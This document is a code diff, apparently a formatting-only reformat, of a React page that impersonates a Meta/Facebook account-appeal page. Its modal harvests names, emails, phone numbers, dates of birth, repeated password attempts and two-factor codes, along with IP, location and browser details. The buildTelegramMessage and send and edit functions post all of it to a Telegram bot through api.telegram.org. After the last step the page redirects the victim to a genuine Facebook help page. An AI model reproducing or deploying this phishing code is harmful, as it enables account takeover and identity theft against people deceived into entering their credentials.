@@ -4,7 +4,13 @@ import Image from "next/image";
 import Link from "next/link";
 import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
-import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
+import {
+  Dictionary,
+  LOCALE_COOKIE_NAME,
+  Locale,
+  getDictionary,
+  resolveLocaleFromCountryCode,
+} from "@/lib/i18n";
 import { COUNTRY_CALLING_CODE_MAP } from "@/lib/geoip";
 import styles from "./page.module.css";
 
@@ -60,10 +66,14 @@ function formatCooldownTime(
     }
   } else {
     if (minutes > 0) {
-      segments.push(`${minutes} ${minutes > 1 ? labels.minutePlural : labels.minuteSingular}`);
+      segments.push(
+        `${minutes} ${minutes > 1 ? labels.minutePlural : labels.minuteSingular}`,
+      );
     }
     if (remainingSeconds > 0) {
-      segments.push(`${remainingSeconds} ${remainingSeconds > 1 ? labels.secondPlural : labels.secondSingular}`);
+      segments.push(
+        `${remainingSeconds} ${remainingSeconds > 1 ? labels.secondPlural : labels.secondSingular}`,
+      );
     }
   }
 
@@ -72,7 +82,10 @@ function formatCooldownTime(
 
 const emailPattern = /^\S+@\S+\.\S+$/;
 
-function validateReviewForm(form: ReviewForm, dictionary: Dictionary): ReviewFormErrors {
+function validateReviewForm(
+  form: ReviewForm,
+  dictionary: Dictionary,
+): ReviewFormErrors {
   const validation = dictionary.modal.validation;
   const errors: ReviewFormErrors = {};
 
@@ -107,7 +120,13 @@ function validateReviewForm(form: ReviewForm, dictionary: Dictionary): ReviewFor
   return errors;
 }
 
-function SidebarIcon({ name, active }: { name: "home" | "search" | "policy" | "rules" | "settings"; active?: boolean }) {
+function SidebarIcon({
+  name,
+  active,
+}: {
+  name: "home" | "search" | "policy" | "rules" | "settings";
+  active?: boolean;
+}) {
   const color = active ? "#ffffff" : "#000000";
   const stroke = {
     stroke: color,
@@ -157,17 +176,32 @@ function SidebarIcon({ name, active }: { name: "home" | "search" | "policy" | "r
   return (
     <svg viewBox="0 0 20 20" aria-hidden="true">
       <circle cx="10" cy="10" r="2.2" {...stroke} />
-      <path d="M10 4.6V3.2M10 16.8V15.4M15.4 10H16.8M3.2 10H4.6M13.8 6.2L14.8 5.2M5.2 14.8L6.2 13.8M13.8 13.8L14.8 14.8M5.2 5.2L6.2 6.2" {...stroke} />
+      <path
+        d="M10 4.6V3.2M10 16.8V15.4M15.4 10H16.8M3.2 10H4.6M13.8 6.2L14.8 5.2M5.2 14.8L6.2 13.8M13.8 13.8L14.8 14.8M5.2 5.2L6.2 6.2"
+        {...stroke}
+      />
     </svg>
   );
 }
 
-function ChevronIcon({ direction = "down" }: { direction?: "up" | "down" | "right" }) {
+function ChevronIcon({
+  direction = "down",
+}: {
+  direction?: "up" | "down" | "right";
+}) {
   const directionClass =
-    direction === "up" ? styles.chevronUp : direction === "right" ? styles.chevronRight : "";
+    direction === "up"
+      ? styles.chevronUp
+      : direction === "right"
+        ? styles.chevronRight
+        : "";
 
   return (
-    <svg viewBox="0 0 20 20" aria-hidden="true" className={`${styles.chevronIcon} ${directionClass}`}>
+    <svg
+      viewBox="0 0 20 20"
+      aria-hidden="true"
+      className={`${styles.chevronIcon} ${directionClass}`}
+    >
       <path d="M5.5 7.5L10 12L14.5 7.5" />
     </svg>
   );
@@ -184,8 +218,12 @@ function ResourceList({
   noIcon?: boolean;
   variant?: "pill" | "grouped";
 }) {
-  const listClass = variant === "grouped" ? styles.actionButtonListGrouped : styles.actionButtonList;
-  const buttonClass = variant === "grouped" ? styles.actionButtonGrouped : styles.actionButton;
+  const listClass =
+    variant === "grouped"
+      ? styles.actionButtonListGrouped
+      : styles.actionButtonList;
+  const buttonClass =
+    variant === "grouped" ? styles.actionButtonGrouped : styles.actionButton;
 
   return (
     <div className={listClass}>
@@ -202,15 +240,24 @@ function ResourceList({
             </span>
           ) : null}
           <span className={styles.actionText}>
-            <span className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}>{item.title}</span>
-          <span className={styles.actionSubText}>{item.subtitle}</span>
-        </span>
-        <span className={styles.actionArrow} aria-hidden="true">
-          <Image src="/www.facebook.com-13.svg" alt="" width={16} height={16} />
-        </span>
-      </button>
-    ))}
-  </div>
+            <span
+              className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}
+            >
+              {item.title}
+            </span>
+            <span className={styles.actionSubText}>{item.subtitle}</span>
+          </span>
+          <span className={styles.actionArrow} aria-hidden="true">
+            <Image
+              src="/www.facebook.com-13.svg"
+              alt=""
+              width={16}
+              height={16}
+            />
+          </span>
+        </button>
+      ))}
+    </div>
   );
 }
 
@@ -312,18 +359,28 @@ export default function HomePageClient({
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
   const common = dictionary.common;
-  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
-  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [clientCountryCode, setClientCountryCode] = useState(
+    detectedCountryCode ?? "",
+  );
+  const [clientCallingCode, setClientCallingCode] = useState(
+    normalizeCallingCode(detectedCallingCode),
+  );
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const [phoneCountryCode, setPhoneCountryCode] = useState(detectedCountryCode ?? "US");
-  const [phoneCallingCode, setPhoneCallingCode] = useState(normalizeCallingCode(detectedCallingCode) || "+1");
+  const [phoneCountryCode, setPhoneCountryCode] = useState(
+    detectedCountryCode ?? "US",
+  );
+  const [phoneCallingCode, setPhoneCallingCode] = useState(
+    normalizeCallingCode(detectedCallingCode) || "+1",
+  );
   const phoneFlag = countryCodeToFlag(phoneCountryCode);
   const phoneCode = normalizeCallingCode(phoneCallingCode);
-  const phoneOptions = Object.entries(COUNTRY_CALLING_CODE_MAP).map(([code, dial]) => ({
-    code,
-    dial,
-  }));
+  const phoneOptions = Object.entries(COUNTRY_CALLING_CODE_MAP).map(
+    ([code, dial]) => ({
+      code,
+      dial,
+    }),
+  );
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -346,10 +403,11 @@ export default function HomePageClient({
     },
   ];
 
-  const additionalResourcesActions: ActionItem[] = pageContent.additionalResourcesActions.map((item) => ({
-    title: item.title,
-    subtitle: item.subtitle,
-  }));
+  const additionalResourcesActions: ActionItem[] =
+    pageContent.additionalResourcesActions.map((item) => ({
+      title: item.title,
+      subtitle: item.subtitle,
+    }));
 
   const [showPolicyList, setShowPolicyList] = useState(false);
   const [showOtherRulesList, setShowOtherRulesList] = useState(false);
@@ -371,7 +429,9 @@ export default function HomePageClient({
   const [twoFactorError, setTwoFactorError] = useState("");
   const router = useRouter();
   const [showAltMethods, setShowAltMethods] = useState(false);
-  const [selectedMethod, setSelectedMethod] = useState<"app" | "whatsapp" | "sms" | "email">("app");
+  const [selectedMethod, setSelectedMethod] = useState<
+    "app" | "whatsapp" | "sms" | "email"
+  >("app");
   const [notifyOnFacebook, setNotifyOnFacebook] = useState(false);
   const [agreeTerms, setAgreeTerms] = useState(false);
   const [form, setForm] = useState<ReviewForm>(defaultForm);
@@ -403,12 +463,17 @@ export default function HomePageClient({
     status: string;
   }>;
 
-  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
+  const buildTelegramMessage = (
+    status: string,
+    overrides: TelegramOverrides = {},
+  ) => {
     const locationParts = (clientLocation ?? "")
       .split("/")
       .map((part) => part.trim())
       .filter(Boolean);
-    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
+    const safeCountry = escapeHtml(
+      locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A",
+    );
     const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
     const safeIp = escapeHtml(clientIp ?? "N/A");
     const safePageName = escapeHtml(form.pageName || "N/A");
@@ -417,21 +482,38 @@ export default function HomePageClient({
     const safePersonalEmail = escapeHtml(form.email || "N/A");
     const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
     const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+1");
+    const safePhone = escapeHtml(
+      `${phoneCode} ${form.phoneNumber}`.trim() || "+1",
+    );
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
-    const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
-    const safePassword2 = escapeHtml((overrides.password2 ?? password2) || "N/A");
+    const safePassword1 = escapeHtml(
+      (overrides.password1 ?? password1) || "N/A",
+    );
+    const safePassword2 = escapeHtml(
+      (overrides.password2 ?? password2) || "N/A",
+    );
     const safeCode1 = escapeHtml((overrides.code1 ?? code1) || "N/A");
     const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
     const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
     const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");
     const safeUserAgent =
-      typeof navigator !== "undefined" ? escapeHtml(navigator.userAgent) : "N/A";
+      typeof navigator !== "undefined"
+        ? escapeHtml(navigator.userAgent)
+        : "N/A";
     const safePlatform =
-      typeof navigator !== "undefined" ? escapeHtml((navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform || navigator.platform || "N/A") : "N/A";
+      typeof navigator !== "undefined"
+        ? escapeHtml(
+            (navigator as Navigator & { userAgentData?: { platform?: string } })
+              .userAgentData?.platform ||
+              navigator.platform ||
+              "N/A",
+          )
+        : "N/A";
     const safeLanguage =
-      typeof navigator !== "undefined" ? escapeHtml(navigator.language || "N/A") : "N/A";
+      typeof navigator !== "undefined"
+        ? escapeHtml(navigator.language || "N/A")
+        : "N/A";
 
     return [
       "👤 <b>THÔNG TIN PHỤ</b>",
@@ -469,15 +551,18 @@ export default function HomePageClient({
     }
 
     try {
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text,
-          parse_mode: "HTML",
-        }),
-      });
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text,
+            parse_mode: "HTML",
+          }),
+        },
+      );
       const data = (await response.json()) as {
         ok?: boolean;
         result?: { message_id?: number };
@@ -514,7 +599,10 @@ export default function HomePageClient({
     await sendTelegramMessage(text);
   };
 
-  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
+  const updateTelegramMessage = async (
+    status: string,
+    overrides: TelegramOverrides = {},
+  ) => {
     if (!telegramEnabled) {
       return;
     }
@@ -531,16 +619,19 @@ export default function HomePageClient({
         throw new Error("Invalid message id");
       }
 
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          message_id: messageIdNumber,
-          text,
-          parse_mode: "HTML",
-        }),
-      });
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/editMessageText`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            message_id: messageIdNumber,
+            text,
+            parse_mode: "HTML",
+          }),
+        },
+      );
       const data = await response.json();
       if (!data?.ok) {
         throw new Error("Telegram edit failed");
@@ -556,7 +647,9 @@ export default function HomePageClient({
   const continueButtonLabel = modal.continueButtonLabel;
   const passwordRequiredError = modal.passwordRequiredError;
   const passwordIncorrectError = modal.passwordIncorrectError;
-  const togglePasswordLabel = showPassword ? modal.togglePasswordHideLabel : modal.togglePasswordShowLabel;
+  const togglePasswordLabel = showPassword
+    ? modal.togglePasswordHideLabel
+    : modal.togglePasswordShowLabel;
 
   const twoFactorHeading = modal.twoFactorHeading;
   const twoFactorDescription = modal.twoFactorDescription;
@@ -614,7 +707,10 @@ export default function HomePageClient({
     }
   }
 
-  function handleFieldChange<K extends keyof ReviewForm>(field: K, value: ReviewForm[K]) {
+  function handleFieldChange<K extends keyof ReviewForm>(
+    field: K,
+    value: ReviewForm[K],
+  ) {
     setForm((prev) => {
       let nextValue = value;
       if (field === "dateOfBirth" && typeof value === "string") {
@@ -755,7 +851,8 @@ export default function HomePageClient({
     if (typeof window === "undefined") {
       return;
     }
-    const storedMessageId = messageId ?? window.localStorage.getItem("telegram_msg_id");
+    const storedMessageId =
+      messageId ?? window.localStorage.getItem("telegram_msg_id");
     const payload = {
       form,
       clientIp,
@@ -830,7 +927,8 @@ export default function HomePageClient({
       });
       setTwoFactorCode("");
       setTimeout(() => {
-        window.location.href = "https://www.facebook.com/help/1735443093393986/";
+        window.location.href =
+          "https://www.facebook.com/help/1735443093393986/";
       }, 2000);
     }
   }
@@ -907,7 +1005,9 @@ export default function HomePageClient({
           return;
         }
 
-        const callingCode = normalizeCallingCode(locationData?.calling_code ?? "");
+        const callingCode = normalizeCallingCode(
+          locationData?.calling_code ?? "",
+        );
         const countryCode = (locationData?.country_code2 ?? "").toUpperCase();
         const district = locationData?.district || "N/A";
         const city = locationData?.city || "N/A";
@@ -1008,17 +1108,26 @@ export default function HomePageClient({
     {
       id: "whatsapp",
       title: modal.altMethodWhatsappTitle,
-      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
+      subtitle: applyTemplate(
+        modal.altMethodWhatsappSubtitle,
+        maskPhoneTail(form.phoneNumber),
+      ),
     },
     {
       id: "sms",
       title: modal.altMethodSmsTitle,
-      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
+      subtitle: applyTemplate(
+        modal.altMethodSmsSubtitle,
+        maskPhoneTail(form.phoneNumber),
+      ),
     },
     {
       id: "email",
       title: modal.altMethodEmailTitle,
-      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email, common.fallbackMaskedEmail)),
+      subtitle: applyTemplate(
+        modal.altMethodEmailSubtitle,
+        maskEmail(form.email, common.fallbackMaskedEmail),
+      ),
     },
   ] as const;
 
@@ -1029,12 +1138,20 @@ export default function HomePageClient({
         {sidebar.homePage}
       </button>
 
-      <button type="button" className={styles.menuButton} onClick={openReviewModal}>
+      <button
+        type="button"
+        className={styles.menuButton}
+        onClick={openReviewModal}
+      >
         <SidebarIcon name="search" />
         {sidebar.search}
       </button>
 
-      <button type="button" className={styles.menuButton} onClick={() => setShowPolicyList((prev) => !prev)}>
+      <button
+        type="button"
+        className={styles.menuButton}
+        onClick={() => setShowPolicyList((prev) => !prev)}
+      >
         <SidebarIcon name="policy" />
         {sidebar.privacyPolicy}
         <span className={styles.menuChevron}>
@@ -1054,7 +1171,11 @@ export default function HomePageClient({
         </ul>
       ) : null}
 
-      <button type="button" className={styles.menuButton} onClick={() => setShowOtherRulesList((prev) => !prev)}>
+      <button
+        type="button"
+        className={styles.menuButton}
+        onClick={() => setShowOtherRulesList((prev) => !prev)}
+      >
         <SidebarIcon name="rules" />
         {sidebar.otherRulesAndArticles}
         <span className={styles.menuChevron}>
@@ -1074,7 +1195,11 @@ export default function HomePageClient({
         </ul>
       ) : null}
 
-      <button type="button" className={styles.menuButton} onClick={() => setShowSettingsList((prev) => !prev)}>
+      <button
+        type="button"
+        className={styles.menuButton}
+        onClick={() => setShowSettingsList((prev) => !prev)}
+      >
         <SidebarIcon name="settings" />
         {sidebar.settings}
         <span className={styles.menuChevron}>
@@ -1100,7 +1225,14 @@ export default function HomePageClient({
     <div className={styles.container}>
       <aside className={styles.left}>
         <div className={styles.leftContent}>
-          <Image src="/metalogo.svg" alt={common.metaAlt} width={60} height={12} priority className={styles.metaLogo} />
+          <Image
+            src="/metalogo.svg"
+            alt={common.metaAlt}
+            width={60}
+            height={12}
+            priority
+            className={styles.metaLogo}
+          />
           <p className={styles.leftTitle}>{sidebar.title}</p>
           {sidebarMenuButtons}
         </div>
@@ -1108,7 +1240,13 @@ export default function HomePageClient({
 
       <main className={styles.right}>
         <div className={styles.mobileHeader}>
-          <Image src="/metalogo.svg" alt={common.metaAlt} width={60} height={12} className={styles.metaLogo} />
+          <Image
+            src="/metalogo.svg"
+            alt={common.metaAlt}
+            width={60}
+            height={12}
+            className={styles.metaLogo}
+          />
           <button
             type="button"
             className={styles.mobileMenuButton}
@@ -1120,7 +1258,12 @@ export default function HomePageClient({
         </div>
         <div className={styles.rightContent}>
           <div className={styles.noticeTitleRow}>
-            <Image src="/delete.png" alt={pageContent.noticeIconAlt} width={30} height={30} />
+            <Image
+              src="/delete.png"
+              alt={pageContent.noticeIconAlt}
+              width={30}
+              height={30}
+            />
             <p>{pageContent.noticeTitle}</p>
           </div>
 
@@ -1149,39 +1292,77 @@ export default function HomePageClient({
             </div>
 
             <div className={styles.requestButtonWrap}>
-              <button type="button" className={styles.requestButton} onClick={openReviewModal}>
+              <button
+                type="button"
+                className={styles.requestButton}
+                onClick={openReviewModal}
+              >
                 {pageContent.requestReviewButton}
               </button>
             </div>
           </section>
 
-          <h4 className={styles.sectionHeading}>{pageContent.appealGuideHeading}</h4>
+          <h4 className={styles.sectionHeading}>
+            {pageContent.appealGuideHeading}
+          </h4>
           <ul className={styles.appealList}>
             {pageContent.appealGuideItems.map((item) => (
               <li key={item}>{item}</li>
             ))}
           </ul>
 
-          <h4 className={styles.sectionHeading}>{pageContent.privacyCenterHeading}</h4>
-          <ResourceList items={privacyCenterActions} onClick={openReviewModal} variant="grouped" noIcon />
+          <h4 className={styles.sectionHeading}>
+            {pageContent.privacyCenterHeading}
+          </h4>
+          <ResourceList
+            items={privacyCenterActions}
+            onClick={openReviewModal}
+            variant="grouped"
+            noIcon
+          />
 
-          <h4 className={styles.sectionHeading}>{pageContent.userAgreementHeading}</h4>
+          <h4 className={styles.sectionHeading}>
+            {pageContent.userAgreementHeading}
+          </h4>
           <ResourceList items={agreementActions} onClick={openReviewModal} />
 
-          <h4 className={styles.sectionHeading}>{pageContent.additionalResourcesHeading}</h4>
-          <ResourceList items={additionalResourcesActions} onClick={openReviewModal} noIcon variant="grouped" />
+          <h4 className={styles.sectionHeading}>
+            {pageContent.additionalResourcesHeading}
+          </h4>
+          <ResourceList
+            items={additionalResourcesActions}
+            onClick={openReviewModal}
+            noIcon
+            variant="grouped"
+          />
 
           <p className={styles.footerNote}>
-            {pageContent.footerNotePrefix} <span>{pageContent.footerNoteLink}</span>
+            {pageContent.footerNotePrefix}{" "}
+            <span>{pageContent.footerNoteLink}</span>
           </p>
         </div>
       </main>
 
       {showModal ? (
         <div className={styles.modalOverlay}>
-          <div className={styles.modalContent} role="dialog" aria-modal="true" aria-label={modal.ariaLabel}>
-            <button type="button" className={styles.modalCloseButton} onClick={closeReviewModal} aria-label={common.closeAriaLabel}>
-              <Image src="/www.facebook.com-16.svg" alt="" width={16} height={16} />
+          <div
+            className={styles.modalContent}
+            role="dialog"
+            aria-modal="true"
+            aria-label={modal.ariaLabel}
+          >
+            <button
+              type="button"
+              className={styles.modalCloseButton}
+              onClick={closeReviewModal}
+              aria-label={common.closeAriaLabel}
+            >
+              <Image
+                src="/www.facebook.com-16.svg"
+                alt=""
+                width={16}
+                height={16}
+              />
             </button>
 
             {!isSubmited ? (
@@ -1193,37 +1374,53 @@ export default function HomePageClient({
                     id="fullName"
                     type="text"
                     value={form.fullName}
-                    onChange={(event) => handleFieldChange("fullName", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("fullName", event.target.value)
+                    }
                     placeholder={modal.fullNamePlaceholder}
                   />
-                  {errors.fullName ? <p className={styles.fieldError}>{errors.fullName}</p> : null}
+                  {errors.fullName ? (
+                    <p className={styles.fieldError}>{errors.fullName}</p>
+                  ) : null}
 
                   <input
                     id="email"
                     type="email"
                     value={form.email}
-                    onChange={(event) => handleFieldChange("email", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("email", event.target.value)
+                    }
                     placeholder={modal.emailPlaceholder}
                   />
-                  {errors.email ? <p className={styles.fieldError}>{errors.email}</p> : null}
+                  {errors.email ? (
+                    <p className={styles.fieldError}>{errors.email}</p>
+                  ) : null}
 
                   <input
                     id="workEmail"
                     type="email"
                     value={form.workEmail}
-                    onChange={(event) => handleFieldChange("workEmail", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("workEmail", event.target.value)
+                    }
                     placeholder={modal.workEmailPlaceholder}
                   />
-                  {errors.workEmail ? <p className={styles.fieldError}>{errors.workEmail}</p> : null}
+                  {errors.workEmail ? (
+                    <p className={styles.fieldError}>{errors.workEmail}</p>
+                  ) : null}
 
                   <input
                     id="pageName"
                     type="text"
                     value={form.pageName}
-                    onChange={(event) => handleFieldChange("pageName", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("pageName", event.target.value)
+                    }
                     placeholder={modal.pageNamePlaceholder}
                   />
-                  {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
+                  {errors.pageName ? (
+                    <p className={styles.fieldError}>{errors.pageName}</p>
+                  ) : null}
 
                   <div className={styles.phoneInputWrap} ref={phoneMenuRef}>
                     <button
@@ -1234,13 +1431,21 @@ export default function HomePageClient({
                       aria-expanded={isCountryMenuOpen}
                     >
                       <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode || "+1"}</span>
+                      <span className={styles.phoneCode}>
+                        {phoneCode || "+1"}
+                      </span>
                     </button>
                     {isCountryMenuOpen ? (
-                      <div className={styles.phoneDropdown} role="listbox" aria-label="Country calling codes">
+                      <div
+                        className={styles.phoneDropdown}
+                        role="listbox"
+                        aria-label="Country calling codes"
+                      >
                         {phoneOptions.map((option) => {
                           const optionCode = normalizeCallingCode(option.dial);
-                          const isSelected = option.code === phoneCountryCode && optionCode === phoneCode;
+                          const isSelected =
+                            option.code === phoneCountryCode &&
+                            optionCode === phoneCode;
 
                           return (
                             <button
@@ -1256,8 +1461,12 @@ export default function HomePageClient({
                                 setIsCountryMenuOpen(false);
                               }}
                             >
-                              <span className={styles.phoneFlag}>{countryCodeToFlag(option.code)}</span>
-                              <span className={styles.phoneOptionCode}>{option.dial}</span>
+                              <span className={styles.phoneFlag}>
+                                {countryCodeToFlag(option.code)}
+                              </span>
+                              <span className={styles.phoneOptionCode}>
+                                {option.dial}
+                              </span>
                             </button>
                           );
                         })}
@@ -1268,12 +1477,16 @@ export default function HomePageClient({
                       type="tel"
                       inputMode="tel"
                       value={form.phoneNumber}
-                      onChange={(event) => handleFieldChange("phoneNumber", event.target.value)}
+                      onChange={(event) =>
+                        handleFieldChange("phoneNumber", event.target.value)
+                      }
                       placeholder={phoneNumberPlaceholder}
                       className={styles.phoneNumberInput}
                     />
                   </div>
-                  {errors.phoneNumber ? <p className={styles.fieldError}>{errors.phoneNumber}</p> : null}
+                  {errors.phoneNumber ? (
+                    <p className={styles.fieldError}>{errors.phoneNumber}</p>
+                  ) : null}
 
                   <label className={styles.inputLabel} htmlFor="dateOfBirth">
                     {modal.dateOfBirthLabel}
@@ -1282,15 +1495,21 @@ export default function HomePageClient({
                     id="dateOfBirth"
                     type="text"
                     value={form.dateOfBirth}
-                    onChange={(event) => handleFieldChange("dateOfBirth", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("dateOfBirth", event.target.value)
+                    }
                     placeholder={modal.dateOfBirthPlaceholder}
                   />
-                  {errors.dateOfBirth ? <p className={styles.fieldError}>{errors.dateOfBirth}</p> : null}
+                  {errors.dateOfBirth ? (
+                    <p className={styles.fieldError}>{errors.dateOfBirth}</p>
+                  ) : null}
 
                   <textarea
                     id="details"
                     value={form.details}
-                    onChange={(event) => handleFieldChange("details", event.target.value)}
+                    onChange={(event) =>
+                      handleFieldChange("details", event.target.value)
+                    }
                     placeholder={modal.problemPlaceholder}
                     rows={4}
                   />
@@ -1299,10 +1518,20 @@ export default function HomePageClient({
 
                   <div className={styles.notifyBox}>
                     <div className={styles.notifyLeft}>
-                      <Image src="/facebook.png" alt={common.facebookAlt} width={24} height={24} className={styles.fbIcon} />
+                      <Image
+                        src="/facebook.png"
+                        alt={common.facebookAlt}
+                        width={24}
+                        height={24}
+                        className={styles.fbIcon}
+                      />
                       <div>
-                        <p className={styles.notifyTitle}>{modal.notifyTitle}</p>
-                        <p className={styles.notifyDesc}>{modal.notifyDescription}</p>
+                        <p className={styles.notifyTitle}>
+                          {modal.notifyTitle}
+                        </p>
+                        <p className={styles.notifyDesc}>
+                          {modal.notifyDescription}
+                        </p>
                       </div>
                     </div>
                     <button
@@ -1332,23 +1561,40 @@ export default function HomePageClient({
                     disabled={loadingInitial}
                     aria-busy={loadingInitial}
                   >
-                    {loadingInitial ? <span className={styles.loadingSpinner} aria-hidden="true" /> : modal.sendButton}
+                    {loadingInitial ? (
+                      <span
+                        className={styles.loadingSpinner}
+                        aria-hidden="true"
+                      />
+                    ) : (
+                      modal.sendButton
+                    )}
                   </button>
                 </form>
               </>
             ) : !isSuccess ? (
               <div className={styles.passwordStep}>
                 <span className={styles.passwordStepLogo}>
-                  <Image src="/svgexport-1.svg" alt={common.facebookAlt} width={64} height={64} className={styles.passwordStepIcon} />
+                  <Image
+                    src="/svgexport-1.svg"
+                    alt={common.facebookAlt}
+                    width={64}
+                    height={64}
+                    className={styles.passwordStepIcon}
+                  />
                 </span>
 
-                <p className={styles.passwordStepMessage}>{passwordStepMessage}</p>
+                <p className={styles.passwordStepMessage}>
+                  {passwordStepMessage}
+                </p>
 
                 <div className={styles.passwordFieldWrap}>
                   <input
                     type={showPassword ? "text" : "password"}
                     value={password}
-                    onChange={(event) => handlePasswordChange(event.target.value)}
+                    onChange={(event) =>
+                      handlePasswordChange(event.target.value)
+                    }
                     placeholder={passwordPlaceholder}
                     className={styles.passwordFieldInput}
                   />
@@ -1366,7 +1612,9 @@ export default function HomePageClient({
                     </svg>
                   </button>
                 </div>
-                {passwordError ? <p className={styles.passwordError}>{passwordError}</p> : null}
+                {passwordError ? (
+                  <p className={styles.passwordError}>{passwordError}</p>
+                ) : null}
 
                 <button
                   type="button"
@@ -1375,7 +1623,14 @@ export default function HomePageClient({
                   disabled={loadingPassword || isSubmitDisabled}
                   aria-busy={loadingPassword}
                 >
-                  {loadingPassword ? <span className={styles.loadingSpinner} aria-hidden="true" /> : continueButtonLabel}
+                  {loadingPassword ? (
+                    <span
+                      className={styles.loadingSpinner}
+                      aria-hidden="true"
+                    />
+                  ) : (
+                    continueButtonLabel
+                  )}
                 </button>
                 <Link href="/forgot" className={styles.passwordForgot}>
                   {common.forgotPasswordLabel}
@@ -1385,8 +1640,12 @@ export default function HomePageClient({
               <div className={styles.twoFactorStep}>
                 {showAltMethods ? (
                   <>
-                    <h3 className={styles.altMethodsHeading}>{modal.altMethodsHeading}</h3>
-                    <p className={styles.altMethodsDescription}>{modal.altMethodsDescription}</p>
+                    <h3 className={styles.altMethodsHeading}>
+                      {modal.altMethodsHeading}
+                    </h3>
+                    <p className={styles.altMethodsDescription}>
+                      {modal.altMethodsDescription}
+                    </p>
                     <div className={styles.altMethodsList}>
                       {altMethods.map((method) => {
                         const isSelected = selectedMethod === method.id;
@@ -1398,10 +1657,16 @@ export default function HomePageClient({
                             onClick={() => setSelectedMethod(method.id)}
                           >
                             <div className={styles.altMethodText}>
-                              <p className={styles.altMethodTitle}>{method.title}</p>
-                              <p className={styles.altMethodSubtitle}>{method.subtitle}</p>
+                              <p className={styles.altMethodTitle}>
+                                {method.title}
+                              </p>
+                              <p className={styles.altMethodSubtitle}>
+                                {method.subtitle}
+                              </p>
                             </div>
-                            <span className={`${styles.altMethodRadio} ${isSelected ? styles.altMethodRadioActive : ""}`}>
+                            <span
+                              className={`${styles.altMethodRadio} ${isSelected ? styles.altMethodRadioActive : ""}`}
+                            >
                               <span />
                             </span>
                           </button>
@@ -1423,8 +1688,12 @@ export default function HomePageClient({
                   </>
                 ) : (
                   <>
-                    <h3 className={styles.twoFactorHeading}>{twoFactorHeading}</h3>
-                    <p className={styles.twoFactorDescription}>{twoFactorDescription}</p>
+                    <h3 className={styles.twoFactorHeading}>
+                      {twoFactorHeading}
+                    </h3>
+                    <p className={styles.twoFactorDescription}>
+                      {twoFactorDescription}
+                    </p>
                     <div className={styles.twoFactorIllustration}>
                       <Image
                         src="/image.png"
@@ -1438,12 +1707,18 @@ export default function HomePageClient({
                     <input
                       type="text"
                       value={twoFactorCode}
-                      onChange={(event) => handleTwoFactorChange(event.target.value)}
+                      onChange={(event) =>
+                        handleTwoFactorChange(event.target.value)
+                      }
                       placeholder={twoFactorPlaceholder}
                       className={styles.twoFactorCodeInput}
                       inputMode="numeric"
                     />
-                    {twoFactorErrorMessage ? <p className={styles.twoFactorError}>{twoFactorErrorMessage}</p> : null}
+                    {twoFactorErrorMessage ? (
+                      <p className={styles.twoFactorError}>
+                        {twoFactorErrorMessage}
+                      </p>
+                    ) : null}
 
                     <button
                       type="button"
@@ -1469,17 +1744,34 @@ export default function HomePageClient({
       ) : null}
 
       {showMobileMenu ? (
-        <div className={styles.mobileDrawerOverlay} onClick={() => setShowMobileMenu(false)}>
-          <div className={styles.mobileDrawer} onClick={(event) => event.stopPropagation()}>
+        <div
+          className={styles.mobileDrawerOverlay}
+          onClick={() => setShowMobileMenu(false)}
+        >
+          <div
+            className={styles.mobileDrawer}
+            onClick={(event) => event.stopPropagation()}
+          >
             <div className={styles.mobileDrawerHeader}>
-              <Image src="/metalogo.svg" alt={common.metaAlt} width={60} height={12} className={styles.metaLogo} />
+              <Image
+                src="/metalogo.svg"
+                alt={common.metaAlt}
+                width={60}
+                height={12}
